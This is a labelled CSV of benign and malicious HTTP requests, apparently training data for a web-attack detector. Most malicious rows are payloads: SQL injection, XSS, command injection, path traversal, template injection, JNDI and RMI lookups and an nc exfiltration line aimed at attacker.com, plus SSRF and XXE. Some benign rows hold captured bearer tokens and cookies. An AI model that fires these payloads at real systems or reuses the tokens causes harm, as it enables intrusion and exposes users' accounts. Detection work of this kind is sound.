method,path,query,headers,body,ua,label
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /health,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/search,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,GET /search?q=security,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/favicon.ico,,,,,0
GET,/index.php,q=admin'--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/favicon.ico,,,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/web-api/orders/c08d07db-2521-4953-8e33-f764fec671e8,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzczNDYyNDciLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMjcxZDA1NDktMjU4ZS00NzIxLThmMmUtODM3M2RjNzQ3MTc3IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzczNDYyNDciLCJzdWIiOiJXRUJTSVRFQDA3NzczNDYyNDciLCJpYXQiOjE3NzA2MzAzNTUsImV4cCI6MTc3MTIzNTE1NX0.WzblDioqj9a6831hF2gFKLC0JBu9gvJuNyoDYiqg564; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 05588c8f-0e51-4b0d-842b-8d67bebc58dc",,python-requests/2.32.5,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /search?q=C%23,,,0
POST,/home,,Host: example.com; Accept: */*,username=user913&password=pass1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/index.php,q=' OR 'x'='x,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,' or '1'='1,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,<body onload=alert(1)>,,,1
GET,/admin,q=&& whoami,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/web-api/orders/404991cb-c612-4cd4-b0d1-2b677a674231,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzIyNDY5MjgiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZmQ3MWU4NWMtZjA0MC00ODAyLTkwMzctMzQ0NGI1YmUxNjcwIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzIyNDY5MjgiLCJzdWIiOiJXRUJTSVRFQDA3NzIyNDY5MjgiLCJpYXQiOjE3NzA2MzAzMDEsImV4cCI6MTc3MTIzNTEwMX0.VLimrNml2PYUxLqccIx0SZ910QFiQmRetsZhBxMo9eE; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: ca7041fa-a975-4adf-b7bb-371859f2abc8",,python-requests/2.32.5,0
POST,/search,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,$(whoami),,,1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /health,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/index.php,option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET /robots.txt,,,0
GET,/,,__proto__[admin]=true,,,1
PUT,/login,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
GET,/,,%0als,,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/search,q=| cat /etc/passwd,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,GET /,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user453&password=pass168,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/index.php/component/chronoforums2/profiles/avatar/u1,tvout=file&av=../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x8664 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x8664 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,php://input,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /health,,,0
GET,/,,Host: evil.com,,,1
PUT,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /api/v1/products,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,${os.system('id')},,,1
GET,/,,GET /,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
POST,/admin,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,curl/7.68.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /login,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,|| ls -la,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
PUT,/admin,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,%0als,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /user/profile,,,0
GET,/,,expect://id,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,%0als,,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,GET /api/v1/products/101,,,0
PUT,/search,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/,,GET /auth/google/callback,,,0
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/index.php,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nikto/2.1.6,1
GET,/index.php,option=com_gcalendar&controller=../../../../../etc/passwd%00,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0,,Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,Host: evil.com,,,1
GET,/,,GET /manifest.json,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,id=1&id=2,,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /static/css/style.css,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,GET /search?q=1+1=2,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,sqlmap/1.5.2,1
GET,/,,GET /settings/security,,,0
GET,/,,GET /manifest.json,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,| id,,,1
GET,/,,$(whoami),,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
DELETE,/login,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/products/kem-chong-nang-bat-tone-da-brightening-tone-up-suncreen-spf-50-pa-50ml-ID113656,_rsc=i7rgj,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7; Cache-Control: no-cache; Connection: keep-alive; Cookie: _ga=GA1.1.164646244.1769138236; _gcl_au=1.1.1228320703.1769138237; _tt_enable_cookie=1; _ttp=01KFMDPBX6K8M1P4V5ZPZ2XWPH_.tt.1; _fbp=fb.1.1769138237800.929220877670769; _ga_1XRVJ9DDS6=GS2.1.s1771520554$o8$g1$t1771520561$j53$l0$h0; ttcsid_CQNEHUJC77UD2I8MDM90=1771520555135::v5Sni78H-ZFvnb5_i3z3.8.1771520565344.1; ttcsid=1771520555140::tcMxaBY4RCeOb0xiHHfr.8.1771520565349.0; ttcsid_CQQA2PJC77U11VCBE7G0=1771520555144::RRyMxhcPCdv4hbw1fUO4.8.1771520565355.1; Host: vivnpay-pilot.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1001%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22908401%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22landing%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22khai-xuan-khai-sac%22%2C%22c%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /landing/khai-xuan-khai-sac; Pragma: no-cache; Referer: https://vivnpay-pilot.vnshop.vn/landing/khai-xuan-khai-sac; Rsc: 1; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; 2201117SG Build/TP1A.220624.014); X-Requested-With: vnpay.smartacccount",,Dalvik/2.1.0 (Linux; U; Android 13; 2201117SG Build/TP1A.220624.014),0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,../../../../etc/passwd,,,1
POST,/index.php,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user645&password=pass370,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/images/index.html,id=%24%7B%40print_r%28%40system%28%22cat+/etc/passwd%22%29%29%7D,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/web-api/orders/260209PHXPPAECY/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ4ODMzMjkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMjNlNWZjNjYtYzQ5OS00ZGFjLWIxMDYtODg2Y2Y5YzBiYWEyIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ4ODMzMjkiLCJzdWIiOiJXRUJTSVRFQDA3NzQ4ODMzMjkiLCJpYXQiOjE3NzA2MzAzMTYsImV4cCI6MTc3MTIzNTExNn0.ZUYqZ6tqWqB0Ej_kTYbHXzIvcE3UcD3lEkckDIIfk4U; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 04706f90-f2aa-4d3d-ab0f-65c004a71a4c",,python-requests/2.32.5,0
POST,/admin,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,%0als,,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
